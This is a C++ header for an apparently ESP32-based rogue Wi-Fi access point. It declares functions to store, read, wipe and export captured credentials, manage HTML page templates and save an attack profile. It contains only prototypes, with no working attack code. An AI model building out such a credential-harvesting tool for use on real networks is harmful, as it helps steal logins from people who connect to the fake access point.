#ifndef ROGUE_AP_STORAGE_H
#define ROGUE_AP_STORAGE_H

#include <Arduino.h>
#include <SPIFFS.h>
#include <vector>
#include "types.h"

bool saveCredentials(const String& ssid, const String& data, const String& clientIp);
String readCapturedCredentials();
void wipeCredentialLog();
String loadHtmlTemplate(const String& filename);
bool saveHtmlTemplate(const String& filename, const String& content);
std::vector<String> listHtmlTemplates();
bool saveAttackConfig(const AttackProfile& config);
bool loadAttackConfig(AttackProfile& config);
String exportCredentialsAsCSV();
unsigned long getScanAgeMinutes(unsigned long lastScanTime);

#endif
